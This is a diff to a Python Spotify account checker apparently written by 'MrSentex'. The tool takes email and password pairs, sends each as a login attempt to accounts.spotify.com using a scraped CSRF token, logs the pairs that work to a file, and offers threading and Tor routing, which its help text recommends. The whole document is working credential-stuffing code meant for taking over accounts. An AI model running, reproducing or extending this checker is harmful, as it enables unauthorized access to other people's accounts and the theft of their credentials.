@@ -20,7 +20,7 @@ def header():
    |\_________\|__|     \|_______|    \|__|  \|_______|\|__|\|__|\|_______|\|_______|\|__| \|__|
    \|_________|                                                                                 
  
-By MrSentex | @fbi_sentex | www.github.com/MrSentex | www.gitlab.com/MrSentex | v0.1-Beta
+By MrSentex | @fbi_sentex | www.github.com/MrSentex | www.gitlab.com/MrSentex | v0.2-Beta
 ''')
 
 class colors:
@@ -42,9 +42,8 @@ def clear():
 
 def get_csrf_token(data):
     data = data.decode()
-    n = data.find('Set-Cookie')
-    pre_csrf = data[n:n+158]
-    csrf = pre_csrf.replace('Set-Cookie: ','').split('=')[1].replace(';', '')
+    data = data[data.find('csrf_token=')+11: len(data)]
+    csrf = data[0:data.find(';Version')]
     return csrf
 
 def plain_http_request_to_json(http_requests):
@@ -77,9 +76,8 @@ def make_post(account, csrf_token):
     ssl_socket.connect(('accounts.spotify.com', 443))
     ssl_socket.sendall(post_data(account[0], account[1], csrf_token))
     api_data = ssl_socket.recv(10000)
-    api_data = plain_http_request_to_json(api_data)
-
-    return api_data
+    api_data_plain = plain_http_request_to_json(api_data)
+    return api_data_plain
 
 def output(email, password):
     with open(args.output, 'a') as ot:
@@ -125,10 +123,10 @@ def check_account(account):
         sys.exit()
     csrf_token = get_csrf_token(spotify_cookies_data)
     if true_or_false_json(make_post(account, csrf_token)):
-        print('['+ Fore.GREEN  + account[0] + Fore.RESET + '] Login correcto!')
+        print('['+ Fore.GREEN  + account[0] + Fore.RESET + ']')
         output(account[0], account[1])
     else:
-        print('['+ Fore.RED + account[0] + Fore.RESET + '] Login fallido!')
+        print('['+ Fore.RED + account[0] + Fore.RESET + ']')
 
 def thread(list_):
     for email, password in list_:
@@ -166,6 +164,7 @@ parser.add_argument('output', help='Archivo de salido')
 parser.add_argument('--tor', help='Usar tor (Recomendado)', action='store_true')
 parser.add_argument('--nothreads', help="Deshabilita el uso de threads (Impacto en el rendimiento)", action='store_true')
 args = parser.parse_args()
+
 
 if args.tor:
     socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
